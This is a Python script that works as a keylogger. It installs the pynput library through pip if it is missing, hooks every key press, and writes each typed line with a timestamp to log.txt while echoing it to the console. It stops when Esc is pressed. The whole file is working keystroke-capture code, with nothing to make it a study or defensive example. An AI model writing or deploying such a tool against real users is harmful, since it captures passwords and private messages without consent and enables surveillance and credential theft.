import subprocess
import sys

# Automatically install pynput if not installed
try:
    import pynput
except ImportError:
    print("pynput not found. Installing...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])
    import pynput  # Import again after installation

from pynput.keyboard import Key, Listener
from datetime import datetime

# Variable Array
ReKey = []

# Open txt file while clearing all the content
with open('log.txt', 'w') as f:
    pass  

# Add pressed key into the recored key every time
def PressEve(key):
    try:
        ReKey.append(key.char)
    except AttributeError:
        if key == Key.enter:
            log_keys(ReKey)
            ReKey.clear()
        elif key == Key.space:  
            ReKey.append(' ')  
        else:
            ReKey.append(str(key))

# Creating time which aligns with the machine
def log_keys(keys):
    now = datetime.now()
    time_str = now.strftime('%H:%M:%S')
    date_str = now.strftime('%Y-%m-%d')
    
    key_str = ''.join(keys)
    
    with open('log.txt', 'a') as f:  
        f.write(f'{time_str} {date_str} : "{key_str}"\n')
        print(f'{time_str} {date_str} : "{key_str}"')
        
# Stop the listening 
def on_release(key):
    if key == Key.esc:
        return False
    
# Start the key listener
with Listener(on_press=PressEve, on_release=on_release) as listener:
    listener.join()
